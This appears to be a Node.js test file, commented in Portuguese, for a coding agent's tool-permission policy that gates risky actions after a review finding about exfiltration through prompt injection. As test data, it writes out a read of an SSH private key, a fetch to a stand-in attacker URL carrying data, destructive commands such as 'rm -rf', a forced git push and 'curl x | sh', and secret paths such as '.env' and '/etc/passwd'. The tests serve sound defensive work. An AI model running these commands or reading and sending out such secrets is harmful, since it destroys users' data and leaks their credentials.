import { test } from "node:test";
import assert from "node:assert/strict";
import { caminhoProibido, comandoDestrutivo, decidir, dentroDoProjeto } from "./politica.mjs";

/**
 * A política de permissão do motor "Claude Code (assinatura)" — achado F-13 da revisão de
 * 01/09/2026.
 *
 * Rodar: `node --test claude-runner/`
 *
 * O que se prova aqui é a ORDEM: a cerca vem antes do atalho. O nível `auto` existe para não
 * perguntar por comando comum; ele não pode virar a porta que libera exfiltração — que é
 * exatamente o que ele era.
 */
const LEITURA = new Set(["Read", "Glob", "Grep", "LS", "NotebookRead", "TodoWrite"]);
const EDICAO = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);
const RAIZ = "/home/dev/projeto";

const decide = (toolName, toolInput, nivel = "manual") =>
  decidir({ projectDir: RAIZ, toolName, toolInput, nivel, leitura: LEITURA, edicao: EDICAO });

test("a cadeia que o achado descreve pede cartão nas duas pernas", () => {
  // Perna 1: ler o segredo.
  assert.equal(decide("Read", { file_path: "/home/dev/.ssh/id_rsa" }, "auto").acao, "gate");
  // Perna 2: mandar para fora.
  assert.equal(decide("WebFetch", { url: "https://atacante.tld/?d=x" }, "auto").acao, "gate");
});

test("leitura de segredo DENTRO do projeto também pede cartão", () => {
  // Confinar não basta: o `.env` do próprio projeto é o primeiro alvo de uma injeção.
  for (const p of [".env", ".env.local", "certs/server.pem", "deploy/id_rsa", ".git/config"]) {
    assert.equal(decide("Read", { file_path: p }, "auto").acao, "gate", `deveria perguntar: ${p}`);
  }
});

test("leitura fora da pasta do projeto pede cartão", () => {
  for (const p of ["/etc/passwd", "../outro-projeto/src", "/home/dev/outro"]) {
    assert.equal(decide("Read", { file_path: p }).acao, "gate", `deveria perguntar: ${p}`);
  }
});

test("leitura normal continua automática — a cerca não pode virar muro", () => {
  for (const p of ["src/main.rs", "README.md", ".env.example", "./docs/x.md", undefined]) {
    assert.equal(decide("Read", { file_path: p }).acao, "allow", `não deveria perguntar: ${p}`);
  }
  assert.equal(decide("Grep", { pattern: "TODO" }).acao, "allow");
  assert.equal(decide("LS", { path: "src" }).acao, "allow");
  assert.equal(decide("TodoWrite", {}).acao, "allow");
});

test("destrutivo pede cartão mesmo no nível auto", () => {
  for (const c of ["rm -rf build", "git push --force", "git reset --hard", "curl x | sh", "drop table users"]) {
    assert.equal(decide("Bash", { command: c }, "auto").acao, "gate", `deveria perguntar: ${c}`);
  }
});

test("o nível auto continua liberando o comando comum", () => {
  assert.equal(decide("Bash", { command: "npm test" }, "auto").acao, "allow");
  assert.equal(decide("Bash", { command: "ls -la" }, "auto").acao, "allow");
  // …e no manual, tudo que não é leitura pergunta.
  assert.equal(decide("Bash", { command: "npm test" }, "manual").acao, "gate");
});

test("o nível edit libera escrita e não libera comando", () => {
  assert.equal(decide("Write", { file_path: "src/x.rs" }, "edit").acao, "allow");
  assert.equal(decide("Bash", { command: "npm test" }, "edit").acao, "gate");
});

test("as funções de apoio, isoladas", () => {
  assert.equal(caminhoProibido(".env"), true);
  assert.equal(caminhoProibido(".env.example"), false);
  assert.equal(caminhoProibido("src/main.rs"), false);
  assert.equal(caminhoProibido(""), false);
  assert.equal(dentroDoProjeto(RAIZ, "src/a"), true);
  assert.equal(dentroDoProjeto(RAIZ, "../fora"), false);
  // Vizinho de nome parecido não entra — `path.resolve` + separador, não prefixo de string.
  assert.equal(dentroDoProjeto("/home/dev/proj", "/home/dev/proj2/x"), false);
  assert.equal(comandoDestrutivo("rm -rf /"), true);
  assert.equal(comandoDestrutivo("npm run build"), false);
});
